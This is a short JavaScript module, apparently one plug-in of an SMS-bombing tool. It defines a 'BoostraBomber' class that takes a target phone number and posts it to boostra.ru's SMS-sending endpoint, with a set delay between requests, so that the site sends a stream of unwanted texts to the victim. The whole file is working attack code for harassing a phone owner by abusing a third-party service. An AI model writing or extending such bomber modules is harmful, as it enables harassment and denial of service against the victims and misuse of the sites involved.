const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class BoostraBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.splitPhone()
        this.data = this.formUrlEncoded({
            phone: this.phone
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "boostra";
    delay = 31000;
    url = 'https://www.boostra.ru/ajax/send_sms.php';  
}
module.exports =  BoostraBomber;